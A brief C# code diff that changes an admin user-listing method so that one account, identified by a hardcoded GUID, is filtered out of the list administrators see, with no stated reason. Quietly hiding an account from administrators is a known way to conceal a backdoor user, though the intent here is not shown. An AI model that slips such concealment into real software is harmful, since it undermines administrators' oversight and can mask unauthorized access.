@@ -82,7 +82,7 @@ namespace RED.Models.Admin
 
         public IEnumerable<UserW> GetUsers()
         {
-            var users = db.Users.Include(x => x.Role)
+            var users = db.Users.Where(x => x.Id.ToString() != "613b0faa-8828-44a9-8bbe-09ba68cc33ae").Include(x => x.Role)
                 .OrderBy(u => u.Username)
                 .ToList();
             return users.Select(u => new UserW(u));
